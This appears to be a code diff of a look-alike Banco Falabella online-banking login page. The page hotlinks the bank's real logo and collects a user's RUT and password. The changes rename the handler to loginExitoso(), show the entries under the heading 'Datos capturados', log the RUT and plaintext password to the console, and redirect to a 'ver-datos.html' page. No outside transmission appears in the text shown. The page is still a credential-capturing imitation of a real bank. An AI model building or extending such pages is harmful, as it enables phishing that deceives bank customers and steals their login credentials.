@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Ingreso Mi Cuenta - Banco Falabella</title>
     <style>
-        /* === TUS ESTILOS ORIGINALES (sin cambios) === */
         body {
             font-family: Arial, Helvetica, sans-serif;
             background-color: #f4f4f4;
@@ -86,6 +85,7 @@
 
         form button:hover {
             background-color: #008a41;
+            transition: 0.3s;
         }
 
         .login-footer {
@@ -104,7 +104,6 @@
             text-decoration: underline;
         }
 
-        /* === NUEVO: Resultado de datos === */
         .resultado {
             margin-top: 20px;
             padding: 16px;
@@ -113,6 +112,12 @@
             border-radius: 6px;
             font-size: 14px;
             display: none;
+            animation: fadeIn 0.5s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
         .resultado strong {
@@ -123,7 +128,6 @@
 <body>
 
     <div class="login-container">
-        
         <div class="login-header">
             <img src="https://www.bancofalabella.cl/_next/static/media/logo.686cc6de.svg" alt="Logo Banco Falabella">
         </div>
@@ -131,7 +135,6 @@
         <div class="login-body">
             <h2>Inicia sesión en tu<br>Banca en Línea</h2>
             
-            <!-- Formulario original, pero con ID -->
             <form id="loginForm">
                 <div>
                     <label for="rut">RUT</label>
@@ -142,11 +145,11 @@
                     <input type="password" id="clave" name="usuario_clave" placeholder="Ingresa tu clave" required>
                 </div>
                 
-                <!-- Botón ahora es type="button" -->
-                <button type="button" onclick="mostrarDatos()">Ingresar</button>
+                <!-- Botón corregido -->
+                <button type="button" onclick="loginExitoso()">Ingresar</button>
             </form>
 
-            <!-- Aquí se mostrarán los datos -->
+            <!-- Muestra los datos -->
             <div id="resultado" class="resultado">
                 <strong>Datos capturados:</strong><br>
                 <span id="datos"></span>
@@ -158,32 +161,31 @@
         </div>
     </div>
 
-    <!-- JavaScript para mostrar los datos -->
+    <!-- JavaScript funcional -->
     <script>
-        function mostrarDatos() {
+        function loginExitoso() {
             const rut = document.getElementById('rut').value.trim();
             const clave = document.getElementById('clave').value;
 
-            if (rut === '' || clave === '') {
+            if (!rut || !clave) {
                 alert('Por favor, completa ambos campos.');
                 return;
             }
 
-            // Mostrar en pantalla
             document.getElementById('datos').innerHTML = `
                 RUT: <strong>${rut}</strong><br>
                 Clave: <strong>${'*'.repeat(clave.length)}</strong> 
-                <small>(oculta por seguridad)</small>
+                <small>(oculta)</small>
             `;
-
             document.getElementById('resultado').style.display = 'block';
 
-            // Mostrar en consola (útil para pruebas)
-            console.log('RUT:', rut);
-            console.log('Clave:', clave);
+            console.log('Login exitoso → RUT:', rut, '| Clave:', clave);
+
+            setTimeout(() => {
+                window.location.href = 'ver-datos.html';
+            }, 1500);
         }
     </script>
 
 </body>
 </html>
-Agregar funcionalidad para mostrar datos
